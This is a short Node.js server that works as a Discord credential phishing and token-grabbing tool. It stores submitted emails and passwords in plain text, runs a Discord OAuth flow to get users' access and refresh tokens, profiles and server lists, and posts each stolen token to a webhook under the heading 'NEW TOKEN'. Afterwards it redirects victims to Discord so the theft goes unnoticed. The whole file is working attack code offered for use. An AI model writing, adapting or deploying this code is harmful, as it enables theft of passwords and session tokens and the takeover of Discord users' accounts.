const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

const db = new sqlite3.Database('tokens.db');
db.run(`CREATE TABLE IF NOT EXISTS tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT,
    password TEXT,
    access_token TEXT,
    refresh_token TEXT,
    user_id TEXT,
    username TEXT,
    guilds TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

app.post('/collect', (req, res) => {
    const { email, password } = req.body;
    db.run(`INSERT INTO tokens (email, password) VALUES (?, ?)`, [email, password]);
    
    const clientId = process.env.CLIENT_ID;
    const redirectUri = process.env.REDIRECT_URI;
    const scope = 'identify guilds email';
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
    
    res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('No code provided.');
    try {
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token',
            new URLSearchParams({
                client_id: process.env.CLIENT_ID,
                client_secret: process.env.CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: process.env.REDIRECT_URI
            }).toString(),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        const { access_token, refresh_token } = tokenRes.data;
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` }
        });
        const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
            headers: { Authorization: `Bearer ${access_token}` }
        });
        db.run(`UPDATE tokens SET access_token = ?, refresh_token = ?, user_id = ?, username = ?, guilds = ? WHERE id = (SELECT MAX(id) FROM tokens)`,
            [access_token, refresh_token, userRes.data.id, userRes.data.username, JSON.stringify(guildsRes.data)]
        );
        if (process.env.WEBHOOK_URL) {
            await axios.post(process.env.WEBHOOK_URL, {
                content: `**NEW TOKEN**\nUser: ${userRes.data.username} (${userRes.data.id})\nToken: ${access_token}`
            });
        }
        res.redirect('https://discord.com/app');
    } catch (error) {
        res.send('Authentication failed.');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
